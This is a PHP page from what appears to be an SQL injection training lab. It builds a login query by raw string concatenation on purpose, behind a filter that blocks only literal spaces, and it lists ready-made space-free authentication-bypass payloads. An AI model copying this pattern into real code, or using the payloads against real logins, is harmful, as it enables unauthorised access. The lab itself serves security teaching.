<?php
// Level 15: Space Filter Bypass - No Spaces Allowed
// Goal: Bypass space character filtering in SQL injection

session_start();

require_once __DIR__ . '/includes/helpers.php';
require_once __DIR__ . '/helpers.php';
$_flag_result = handle_inline_flag_submit(15);
// Database connection
$host = $_ENV['DB_HOST'] ?? 'db';
$user = $_ENV['DB_USER'] ?? 'webapp';
$pass = $_ENV['DB_PASS'] ?? 'webapp123';
$dbname = $_ENV['DB_NAME'] ?? 'sqli_lab';

$conn = new mysqli($host, $user, $pass, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$message = "";
$success = false;
$detected_spaces = false;

if ($_POST) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    // Check for space characters
    if (strpos($username, ' ') !== false || strpos($password, ' ') !== false) {
        $detected_spaces = true;
        $message = " Security Filter: Space characters are not allowed!<br>";
        $message .= " Detected spaces in: ";
        $space_locations = [];
        if (strpos($username, ' ') !== false) $space_locations[] = "username";
        if (strpos($password, ' ') !== false) $space_locations[] = "password";
        $message .= implode(', ', $space_locations) . "<br>";
        $message .= " Try alternative space bypasses!";
    } else {
        // VULNERABLE query (if space filter is bypassed)
        $sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";

        try {
            $result = $conn->query($sql);

            if ($result && $result->num_rows > 0) {
                $user_data = $result->fetch_assoc();

                if ($user_data['role'] === 'admin') {
                    $success = true;
                    $flag = get_flag_for_level(15);
                    $message = "Great job! You bypassed the space filter and reached admin.<br>";
                    $message .= "<strong>Flag:</strong> <code>" . htmlspecialchars($flag) . "</code><br>";
                    $message .= "No spaces detected in your payload.<br>";
                    $message .= "SQL query: <code>" . htmlspecialchars($sql) . "</code><br>";
                    $message .= "Administrator access achieved without spaces!";
                } else {
                    $message = "Login successful as: " . htmlspecialchars($user_data['username']) . " (" . htmlspecialchars($user_data['role']) . ")";
                    $message .= "<br>You still need the admin role to get the flag.";
                }
            } else {
               $message = "Authentication failed: no matching user found.";
                $message .= "<br>SQL query: <code>" . htmlspecialchars($sql) . "</code>";
            }

        } catch (Exception $e) {
            $message = "SQL error: " . $e->getMessage();
            $message .= "<br>SQL query: <code>" . htmlspecialchars($sql) . "</code>";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Level 15 - Space Filter Bypass | SQL Injection Lab</title>
    <link rel="stylesheet" href="css/styles.css">

</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Level 15 - Space Filter Bypass</h1>
            <p>Exploit SQL injection without using space characters</p>
            <a href="index.php" class="back-btn">&larr; Back to Labs</a>
        </div>

        <div class="challenge-layout">
            <!-- Left: Source Code Panel -->
            <div class="code-panel">
                <h3>Vulnerable Source Code</h3>
                <div class="source-code">
                    <pre><code><span class="php-comment">// BLOCKS only ASCII 32 (literal space)</span>
<span class="php-keyword">if</span> (<span class="php-function">strpos</span>(<span class="php-variable">$username</span>, <span class="php-string">' '</span>) !== <span class="php-keyword">false</span>
 || <span class="php-function">strpos</span>(<span class="php-variable">$password</span>,  <span class="php-string">' '</span>) !== <span class="php-keyword">false</span>) {
    <span class="php-comment">// block: space detected</span>
} <span class="php-keyword">else</span> {
    <span class="php-comment">// VULNERABLE: space-checked input in raw SQL</span>
<span class="vuln-line">    <span class="php-variable">$sql</span> = <span class="php-string">"SELECT * FROM users"</span>
         . <span class="php-string">" WHERE username='$username'"</span>
         . <span class="php-string">" AND password='$password'"</span>;</span>
    <span class="php-variable">$result</span> = <span class="php-variable">$conn</span>-&gt;<span class="php-function">query</span>(<span class="php-variable">$sql</span>);
    <span class="php-keyword">if</span> (<span class="php-variable">$result</span>[<span class="php-string">'role'</span>] === <span class="php-string">'admin'</span>) {
        <span class="php-comment">// flag awarded</span>
    }
}</code></pre>
                </div>
                <div class="vuln-annotation">
                    <strong>Vulnerability:</strong>&nbsp; Only the literal ASCII 32 space character is blocked. MySQL treats <code>/**/</code>, tab (<code>\t</code>), newline (<code>\n</code>), and other whitespace as valid token separators. An attacker can substitute any of these to construct valid SQL keywords without ever sending a space.
                </div>
            </div>

            <!-- Right: Challenge Panel -->
            <div class="challenge-panel">
                <h3>Challenge</h3>
                <div class="panel-body">
                    <p>This form rejects any input containing a literal space character. However, the SQL query is still built from raw string concatenation.</p>
                    <p><strong>Goal:</strong> Inject SQL into the login form <em>without using spaces</em> to authenticate as <code>admin</code>!</p>

                    <div class="space-detector">
                        SPACE CHARACTER DETECTOR ACTIVE<br>
                        All inputs will be scanned for space characters (ASCII 32)
                    </div>

                    <div class="bypass-techniques">
                        <strong>Space Bypass Techniques:</strong><br>

                        <div class="technique">
                            <strong>1. Comment-based Spacing:</strong><br>
                            <code>admin'/**/OR/**/'1'='1</code>
                        </div>

                        <div class="technique">
                            <strong>2. Tab Character:</strong><br>
                            <code>admin'&Tab;OR&Tab;'1'='1</code>
                        </div>

                        <div class="technique">
                            <strong>3. Newline Characters:</strong><br>
                            <code>admin'%0AOR%0A'1'='1</code>
                        </div>

                        <div class="technique">
                            <strong>4. Parentheses Grouping:</strong><br>
                            <code>admin'OR('1'='1</code>
                        </div>
                    </div>

                    <?php if ($message): ?>
                        <div class="message <?= $success ? 'success' : (stripos($message, 'error') !== false ? 'error' : 'info') ?>">
                            <?= $message ?>
                        </div>
                    <?php endif; ?>

                    <h3>Space-Free Login</h3>
                    <form method="POST" class="login-form">
                        <div class="form-group">
                            <label for="username">Username:</label>
                            <input type="text" id="username" name="username" placeholder="Enter username (NO SPACES!)" required>
                        </div>

                        <div class="form-group">
                            <label for="password">Password:</label>
                            <input type="text" id="password" name="password" placeholder="Enter password (NO SPACES!)" required>
                        </div>

                        <button type="submit" class="submit-btn">Login</button>
                    </form>
                </div>
            </div>
        </div>

        <?= render_hint_section(get_level_hints(15), 'Hints for Level 15'); ?>

    <?= render_inline_flag_form(15, $_flag_result) ?>

        <div class="navigation">
            <a href="level14.php">&larr; Previous Level</a>
            <a href="level16.php">Next Level &rarr;</a>
        </div>
    </div>
</body>
</html>

<?php $conn->close(); ?>
